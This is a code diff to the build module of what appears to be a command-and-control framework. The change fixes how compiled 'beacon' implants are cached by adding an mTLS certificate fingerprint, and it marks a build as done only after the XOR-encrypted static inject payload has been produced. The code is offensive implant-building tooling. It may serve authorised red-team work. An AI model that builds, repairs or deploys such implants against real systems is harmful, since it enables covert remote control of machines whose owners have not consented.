@@ -3,6 +3,7 @@ import re
 import secrets
 import shutil
 import base64
+import hashlib
 import struct
 import subprocess
 import sys
@@ -46,14 +47,62 @@ def _endpoint_key(host: str, port, use_ssl) -> str:
     return f"{str(host or '').strip()}:{int(port or 0)}:{int(bool(use_ssl))}"
 
 
+def _mtls_fingerprint() -> str:
+    """Hash of the mTLS material a beacon would be compiled against.
+
+    `crypto_fingerprint` covers the AES key/nonce only. The beacon also gets
+    a CLIENT certificate signed by the current data-dir CA at build time; a
+    new engagement/data dir rotates that CA. Without this, a cached binary
+    from a previous run presented an old client cert to a `CERT_REQUIRED`
+    listener and every check-in died in the TLS handshake (live defect
+    2026-11-11: deploy succeeded, beacon ran, zero registrations).
+    """
+    try:
+        from phantom.utils.state import use_mtls
+        if not use_mtls():
+            return ""
+        from phantom.utils.paths import certs_dir
+        base = certs_dir()
+    except Exception:
+        return ""
+    h = hashlib.sha256()
+    found = False
+    for name in ("client_ca.crt", "client_ca.key", "mtls_server.crt",
+                 "mtls_server.key"):
+        path = os.path.join(base, name)
+        if not os.path.exists(path):
+            continue
+        found = True
+        h.update(name.encode("utf-8") + b"\0")
+        try:
+            with open(path, "rb") as f:
+                h.update(f.read())
+        except OSError:
+            return ""
+    return h.hexdigest() if found else ""
+
+
+def _build_fingerprint(endpoint: str = "") -> str:
+    return (crypto_fingerprint()
+            + ("|" + endpoint if endpoint else "")
+            + "|mtls:" + _mtls_fingerprint())
+
+
 def _needs_rebuild(beacon_dir: str, out_name: str,
                    endpoint: str = "") -> bool:
-    """True if the binary is missing, or keys/endpoint changed since build."""
+    """True if the binary is missing, or keys/endpoint/mTLS changed."""
     beacon_out = os.path.join(beacon_dir, out_name)
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     if not os.path.exists(beacon_out):
         return True
-    current = crypto_fingerprint() + ("|" + endpoint if endpoint else "")
+    # Linux auto-mode deploys the STATIC artifact, but the fingerprint is
+    # stored for the dynamic one. A missing/stale static build used to be
+    # returned as "already built" forever.
+    if out_name == "beacon_linux":
+        static = os.path.join(beacon_dir, "beacon_linux_static")
+        if not os.path.exists(static):
+            return True
+    current = _build_fingerprint(endpoint)
     if not os.path.exists(hash_file):
         return True
     try:
@@ -66,7 +115,7 @@ def _needs_rebuild(beacon_dir: str, out_name: str,
 def _mark_built(beacon_dir: str, out_name: str, endpoint: str = "") -> None:
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     with open(hash_file, "w", encoding="utf-8") as f:
-        f.write(crypto_fingerprint() + ("|" + endpoint if endpoint else ""))
+        f.write(_build_fingerprint(endpoint))
 
 
 def _xor_encrypt(data: bytes, key: int = _XOR_KEY) -> bytes:
@@ -855,9 +904,9 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                                    capture_output=True, text=True, timeout=600)
 
             _run(_build_cmd(static=False))
-            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
 
-            # Static + XOR'd inject payload (deploy artifact)
+            # Static + XOR'd inject payload (deploy artifact). Only mark the
+            # build cache once the static deploy artifact exists too.
             static_path = os.path.join(beacon_dir, static_name)
             try:
                 _run(_build_cmd(static=True))
@@ -879,6 +928,9 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
             except Exception as static_err:
                 console.print(f"[yellow][!] Static inject payload not built: {static_err}[/yellow]")
+            if os.path.exists(static_path):
+                _mark_built(beacon_dir, out_name,
+                            _endpoint_key(host, port, use_ssl))
 
             return beacon_out
         except subprocess.CalledProcessError as e:
